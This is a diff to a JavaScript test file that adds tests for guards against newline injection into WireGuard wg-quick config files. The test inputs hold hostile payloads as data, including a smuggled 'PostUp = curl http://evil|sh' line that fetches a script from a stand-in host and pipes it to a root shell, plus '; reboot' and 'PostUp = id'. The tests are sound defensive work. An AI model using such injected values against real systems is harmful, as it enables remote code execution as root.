@@ -7,6 +7,7 @@ import {
 	_buildPeerUpdates,
 	buildLinkRecord,
 	canonicalizeIpv4Network,
+	isValidInterfaceAddress,
 	buildRouteAnalysis,
 	buildTopology,
 	classifyLinkType,
@@ -29,6 +30,46 @@ test("canonicalizeIpv4Network masks host bits and rejects IPv6 / out-of-range / 
 	assert.equal(canonicalizeIpv4Network("999.0.0.0/8"), null, "out-of-range octet");
 	assert.equal(canonicalizeIpv4Network("10.0.0.0/33"), null, "bad prefix");
 	assert.equal(canonicalizeIpv4Network("10.0.0.0"), null, "missing prefix");
+});
+
+// ─── isValidInterfaceAddress (newline/PostUp injection guard for createInterface) ─
+
+test("isValidInterfaceAddress accepts clean host CIDRs and rejects injection / malformed input", () => {
+	// Valid IPv4 host addresses with a prefix — host bits are intentionally kept.
+	assert.equal(isValidInterfaceAddress("10.20.0.1/24"), true);
+	assert.equal(isValidInterfaceAddress(" 10.10.0.1/25 "), true, "surrounding whitespace trimmed");
+	assert.equal(isValidInterfaceAddress("192.168.1.254/32"), true);
+	// Valid IPv6 host with a mandatory prefix.
+	assert.equal(isValidInterfaceAddress("fd00:50::1/64"), true);
+
+	// The core RCE vector: a newline that survives String.trim() and would inject an
+	// attacker-controlled `PostUp = <cmd>` line into the wg-quick conf (run as root).
+	assert.equal(isValidInterfaceAddress("10.20.0.1/24\nPostUp = curl http://evil|sh"), false);
+	assert.equal(isValidInterfaceAddress("10.20.0.1/24 PostUp = id"), false, "embedded space rejected");
+	assert.equal(isValidInterfaceAddress("10.20.0.1/24; reboot"), false);
+	assert.equal(isValidInterfaceAddress("10.20.0.1"), false, "missing prefix");
+	assert.equal(isValidInterfaceAddress("999.0.0.1/24"), false, "octet out of range");
+	assert.equal(isValidInterfaceAddress("10.20.0.1/33"), false, "prefix out of range");
+	assert.equal(isValidInterfaceAddress("fd00::1"), false, "IPv6 without prefix rejected");
+	assert.equal(isValidInterfaceAddress(""), false);
+	assert.equal(isValidInterfaceAddress(null), false);
+});
+
+// ─── link name control-char stripping (newline/PostUp injection guard) ───────
+
+// A peer/link name is rendered verbatim as a `# <name>` comment line into the
+// wg-quick conf; an embedded newline could smuggle an attacker-controlled
+// `[Interface]`/`PostUp = <cmd>` line that wg-quick runs as root. The name sink must
+// strip control characters so a malicious value can never be persisted and re-rendered.
+test("sanitizeLinkMetadata strips control characters from the name (no conf injection)", () => {
+	const link = sanitizeLinkMetadata({
+		type: "client",
+		name: "evil\n[Interface]\nPostUp = curl http://evil|sh",
+	});
+	assert.equal(link.name, "evil[Interface]PostUp = curl http://evil|sh");
+	assert.ok(!link.name.includes("\n"), "newlines removed");
+	// A clean name is preserved unchanged.
+	assert.equal(sanitizeLinkMetadata({ name: "Office Laptop" }).name, "Office Laptop");
 });
 
 // ─── _buildPeerUpdates (hub-side AllowedIPs recompute) ───────────────────────
